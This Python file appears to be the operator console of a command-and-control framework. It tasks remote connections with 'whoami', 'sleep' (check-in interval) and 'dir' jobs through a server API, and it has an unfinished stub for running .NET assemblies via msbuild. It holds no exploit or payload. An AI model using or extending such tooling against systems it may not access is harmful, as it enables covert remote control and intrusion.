import argparse

import connect
import cmd2
import os

from cmd2 import CommandSet, with_default_category, with_argparser
from requests import post


def post_job(job):
    """ Excepts a job of the following format: "name":"<name>", "arguments":"[argument, argument]" """
    job_string = f'{{"api_key":"{connect.client.api_key}","connection_id":"{connect.client.current_connection}",{job}}}'
    post(f'{connect.client.server_uri}/jobs', job_string)


@with_default_category('Standard API')
class STDAPICommands(CommandSet):
    def __init__(self):
        super().__init__()

    """ 
    Whoami Command 
    """

    def do_whoami(self, _: cmd2.Statement):
        """ Retrieve the username of the current user. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        post_job('"name":"whoami","arguments":"","type":0')

    """ 
    Sleep Command 
    """

    dir_sleep = cmd2.Cmd2ArgumentParser()
    dir_sleep.add_argument('sleep', help='amount of time in milliseconds to sleep for')

    @with_argparser(dir_sleep)
    def do_sleep(self, ns: argparse.Namespace):
        """ Change the check_in interval in milliseconds (e.g., 5000 is 5 seconds). """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        post_job(f'"name":"sleep","arguments":"{ns.sleep}","type":0')

    """ 
    Dir Command 
    """

    dir_parser = cmd2.Cmd2ArgumentParser()
    dir_parser.add_argument('dir', help='the directory to inspect')

    @with_argparser(dir_parser)
    def do_dir(self, ns: argparse.Namespace):
        """ List the contents and properties of a directory. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        directory = ns.dir.replace('\\', '\\\\')
        post_job(f'"name":"dir","arguments":"{directory}","type":1')

    dir_parser = cmd2.Cmd2ArgumentParser()
    dir_parser.add_argument('assembly', completer=cmd2.Cmd.path_complete, help='the assembly to execute')

    @with_argparser(dir_parser)
    def do_msbuild(self, ns: argparse.Namespace):
        """ Executes a .NET assembly with msbuild. """
        pass